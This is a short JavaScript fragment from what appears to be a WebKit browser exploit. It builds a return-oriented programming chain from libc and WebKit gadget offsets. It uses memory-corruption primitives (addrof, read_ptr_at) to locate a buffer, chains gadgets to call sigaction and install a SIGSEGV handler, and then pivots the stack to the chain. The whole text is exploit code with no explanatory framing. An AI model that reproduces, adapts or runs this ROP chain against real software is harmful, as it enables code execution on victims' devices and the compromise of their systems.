var ropchain_array = new Uint32Array(62);
var ropchain = read_ptr_at(addrof(ropchain_array)+0x10);
var ropchain_offset = 2;
function set_gadget(val)
{
    ropchain_array[ropchain_offset++] = val | 0;
    ropchain_array[ropchain_offset++] = (val / 4294967296) | 0;
}
function set_gadgets(l)
{
    for(var i = 0; i < l.length; i++)
        set_gadget(l[i]);
}
function db(data)
{
    for(var i = 0; i < data.length; i++)
        ropchain_array[ropchain_offset++] = data[i];
}
set_gadgets([
libc_base+289418, //pop rcx
ropchain+96, //rdi_stash
libc_base+106202, //mov [rcx], rdi
libc_base+276082 //pop rdi
]);
db([11, 0]); // 0xb
set_gadgets([
libc_base+77390, //pop rsi
ropchain+112, //sigaction
webkit_base+87786 //pop rdx
]);
db([0, 0]); // 0x0
set_gadgets([
sigaction_addr,
libc_base+276082 //pop rdi
]);
//rdi_stash:
db([0, 0]); // 0x0
set_gadgets([
pivot_addr,
//sigaction:
sigsegv_handler
]);
ropchain_offset += 32;
pivot(ropchain);
